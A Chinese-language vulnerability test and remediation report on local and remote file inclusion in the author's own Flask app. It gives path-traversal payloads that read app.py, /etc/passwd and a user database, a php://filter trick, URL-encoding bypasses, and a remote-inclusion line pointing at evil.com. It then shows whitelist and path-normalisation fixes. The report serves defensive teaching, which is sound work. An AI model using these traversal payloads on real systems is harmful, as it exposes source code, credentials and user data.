# 文件包含漏洞（LFI/RFI）测试与修复报告

---

## 一、概述

### 1.1 什么是文件包含漏洞？

文件包含漏洞是指程序**动态加载文件时，使用了用户可控的参数**来拼接文件路径，且没有做充分的校验。攻击者可以通过修改参数来加载意料之外的文件。

**本地文件包含（LFI）：** 读取服务器上的本地文件
```
/page?name=../../etc/passwd    → 读取系统密码文件
/page?name=../app.py           → 读取项目源码
```

**远程文件包含（RFI）：** 加载远程服务器上的文件
```
/page?name=http://evil.com/shell.txt  → 执行远程恶意代码
```

**打个比方：** 图书馆的自助借书机，你输入书名就能拿到书。但如果系统没检查，你输入的不是书名而是"管理员办公室钥匙存放处"——你就拿到了不该拿的东西。

### 1.2 与本项目的关系

本项目在动态页面加载功能中，使用了以下代码：

```python
# ❌ 修复前：直接拼接用户输入
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")
    file_path = os.path.join("pages", name)  # 直接拼接！
    ...读取文件...
```

用户通过 `/page?name=help` 访问帮助页面，但如果把 `name` 改成 `../app.py`，就能读到源码。

## 二、修复前的漏洞分析

### 2.1 漏洞代码

```python
# 修复前的 /page 路由
name = request.args.get("name", "")          # 从URL参数获取文件名
file_path = os.path.join("pages", name)       # 直接拼接到路径

if os.path.exists(file_path):
    with open(file_path, "r") as f:
        page_content = f.read()              # 读取文件内容
else:
    file_path_html = file_path + ".html"      # 尝试加.html后缀
    if os.path.exists(file_path_html):
        with open(file_path_html, "r") as f:
            page_content = f.read()           # 读取文件内容
```

**问题所在：**
1. `name` 参数**没有任何过滤**
2. `../` 没有被拦截 → 可以穿越目录
3. 文件内容直接输出到页面 → 敏感信息泄露

### 2.2 攻击演示

#### LFI 攻击 1：读取源码

```bash
# 读取 Flask 主程序源码
/page?name=../app.py

os.path.join("pages", "../app.py")
→ "pages/../app.py" → "app.py"（穿越成功！）
```

**结果：** 页面直接显示了 `app.py` 的全部源码，包括数据库配置、密钥、业务逻辑。

#### LFI 攻击 2：读取系统文件

```bash
# 读取 Linux 密码文件
/page?name=../../../../etc/passwd

os.path.join("pages", "../../../../etc/passwd")
→ "pages/../../../../etc/passwd" → "/etc/passwd"（穿越成功！）
```

**结果：** 如果使用足够多的 `../`，可以读取服务器上的任意文件。

#### LFI 攻击 3：读取其他目录文件

```bash
# 读取登录页面模板（发现更多攻击面）
/page?name=../templates/login

os.path.join("pages", "../templates/login")
→ "pages/../templates/login" → 不存在，尝试加.html
→ "pages/../templates/login.html" → 存在，读取成功！
```

**结果：** 泄露前端模板，可能发现隐藏接口、注释中的密码等。

#### LFI 攻击 4：配合 PHP 伪协议（如果存在 PHP 解析）

```bash
# 读取经过 base64 编码的 PHP 文件
/page?name=php://filter/convert.base64-encode/resource=config.php
```

本项目是 Python Flask，不受 PHP 伪协议影响，但如果是 PHP 环境，这种攻击能绕过 PHP 文件解析直接查看源码。

### 2.3 攻击影响范围

| 目标文件 | 路径 | 能否读取 |
|---------|------|:-------:|
| 主程序源码 | `../app.py` | ✅ 成功 |
| 登录模板 | `../templates/login` | ✅ 成功 |
| 数据库文件 | `../../data/users.db` | ✅ 成功 |
| CSS 样式 | `../static/css/style.css` | ✅ 成功 |
| 系统密码 | `../../../../etc/passwd` | ✅ 成功 |
| 系统配置 | `../../../../etc/shadow` | ⚠️ 需 root 权限 |

## 三、攻击原理详解

### 3.1 路径穿越（Path Traversal）

```
正常路径：    pages/help.html                  → 在 pages 目录下，安全
路径穿越：    pages/../app.py                  = app.py（穿到上级）
深度穿越：    pages/../../../../etc/passwd     = /etc/passwd（穿到根目录）
```

**穿越层数估算：**
```
/pages/              ← 项目根目录下的 pages 文件夹
../app.py            ← 回到项目根目录，读 app.py
../../data/users.db  ← 从 pages 回到项目根目录，再进入 data/
../../../../../../etc/passwd  ← 一直穿到根目录的 etc/passwd
```

### 3.2 文件包含的类型

| 类型 | 英文 | 说明 |
|:---:|:----:|------|
| **本地文件包含** | LFI | 读取服务器本地文件 |
| **远程文件包含** | RFI | 加载远程服务器文件（需 allow_url_include） |
| **日志文件包含** | Log Injection | 将恶意代码写入日志，再包含日志文件 |
| **Session 文件包含** | Session Include | 包含 PHP session 文件 |
| **/proc/self/environ** | Environment | 通过环境变量注入代码 |

### 3.3 本项目的风险等级

```
LFI 风险: ⭐⭐⭐⭐⭐（严重）
  ├─ 可以读取任何 .py / .html / .db 文件
  ├─ 可以读取系统配置文件
  └─ 为后续攻击提供信息
      
RFI 风险: ⭐（不适用）
  └─ Python 的 open() 不支持远程协议

PHP 伪协议风险: ⭐（不适用）
  └─ 本项目是 Flask，非 PHP 环境
```

## 四、修复方案

### 4.1 修复后的代码

```python
# ✅ 修复后：白名单机制
ALLOWED_PAGES = {"help", "about", "contact", "faq"}

@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")
    
    if name:
        # 只保留文件名，去掉路径
        clean_name = os.path.basename(name)
        # 去掉扩展名
        if "." in clean_name:
            clean_name = clean_name.rsplit(".", 1)[0]
        
        # 白名单校验
        if clean_name in ALLOWED_PAGES:
            file_path = os.path.join("pages", clean_name + ".html")
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    page_content = f.read()
```

### 4.2 修复前后对比

| 测试项 | 修复前 | 修复后 |
|-------|:-----:|:-----:|
| `?name=help` | ✅ 正常显示 | ✅ 正常显示 |
| `?name=../app.py` | ✅ **读到源码了！** | 🚫 显示"页面不存在" |
| `?name=../templates/login` | ✅ **读到模板了！** | 🚫 显示"页面不存在" |
| `?name=../../etc/passwd` | ✅ **读到系统文件了！** | 🚫 显示"页面不存在" |
| `?name=about` | ❌ 404 | ✅ 可正常添加新页面 |
| `?name=notexist` | ❌ 显示"页面不存在" | ❌ 显示"页面不存在" |

### 4.3 修复原理

```
修复前：允许访问任何文件
  name = 用户输入
  path = pages/ + name
  用户说啥就是啥 → 路径穿越

修复后：只允许 4 个预定义页面
  name = 用户输入
  clean = basename(name)    → 去掉 ../
  clean = 去掉扩展名        → 防止猜后缀
  if clean 在白名单中:
    只读 pages/clean.html
  不在白名单中 → 页面不存在
```

## 五、三种防御方案对比

| 方案 | 实现难度 | 安全性 | 灵活性 |
|:----:|:-------:|:-----:|:-----:|
| **① 白名单**（本项目采用） | ⭐ 简单 | ✅ 最高 | ❌ 低（需预定义） |
| **② 正则过滤 ../** | ⭐⭐ 中等 | ⚠️ 中等 | ✅ 高 |
| **③ 路径规范化** | ⭐ 简单 | ✅ 高 | ✅ 中 |

### 方案一：白名单（推荐）

```python
ALLOWED = {"help", "about"}
if name in ALLOWED:
    # 安全
```

**优点：** 最简单、最安全，不在名单里的一律拒绝
**缺点：** 每增加一个页面都要改代码

### 方案二：过滤 `../`

```python
# 不推荐——总有遗漏的绕过方式
name = name.replace("../", "")
# 可以被绕过：....//  → 去掉../ → 剩下../
```

### 方案三：路径规范化

```python
import os

# 规范化路径，检查是否在允许目录内
base_dir = os.path.abspath("pages")
file_path = os.path.abspath(os.path.join("pages", name))

if file_path.startswith(base_dir):
    # 安全——确保没穿出去
    with open(file_path) as f:
        content = f.read()
```

**原理：** 不管用户怎么穿越，规范化后看最终路径是否还在 `pages/` 目录下。

## 六、文件包含漏洞的常见绕过手法

| 绕过手法 | 示例 | 是否适用本项目（修复前） |
|---------|------|:---------------------:|
| 直接 `../` | `../app.py` | ✅ 成功 |
| 多层 `../` | `../../../../etc/passwd` | ✅ 成功 |
| URL 编码 | `%2e%2e%2f`（`../` 的URL编码） | ✅ 成功（Flask自动解码） |
| 双重 URL 编码 | `%252e%252e%252f` | ❌ Flask只解码一次 |
| Windows 路径 | `..\..\app.py` | ❌ Linux 环境 |
| 绝对路径 | `/etc/passwd` | ⚠️ 需配合 `os.path.join` 特性 |

## 七、结合 WAF 的防护思路

从之前 SQL 注入测试中积累的 WAF 经验，文件包含漏洞也可用类似思路防御：

| WAF 规则 | 拦截内容 | 绕过方式 |
|---------|---------|---------|
| 拦截 `../` | `/page?name=../app.py` | ❌ 封死路径穿越 |

| 参数白名单 | 只允许特定值 | ❌ 最简单直接 |

## 八、总结

### 8.1 漏洞危害

> **文件包含漏洞允许攻击者读取服务器上的任意文件，是危害最大的 Web 漏洞之一。**

在本项目中，修复前可以通过简单的 `../` 路径穿越读取：
- 全部 Python 源码
- 数据库文件（含用户信息）
- HTML 模板
- 系统配置文件

### 8.2 根本原因

```python
# 一句话：永远不要相信用户的输入
file_path = os.path.join("pages", name)  # ❌ 错在这里
```

### 8.3 修复原则

```
输入不可信 → 白名单校验 → 路径规范化 → 安全读取
```

### 8.4 后续建议

| 建议 | 说明 |
|------|------|
| 白名单定期审查 | 确保不用的页面及时从名单中移除 |
| 文件权限控制 | `pages/` 目录设置只读权限 |
| 日志监控 | 记录对 `/page` 路由的异常访问（包含 `..` 的参数） |
| 限制敏感信息 | 即使发生包含，也要避免数据库配置等敏感信息在代码中明文出现 |
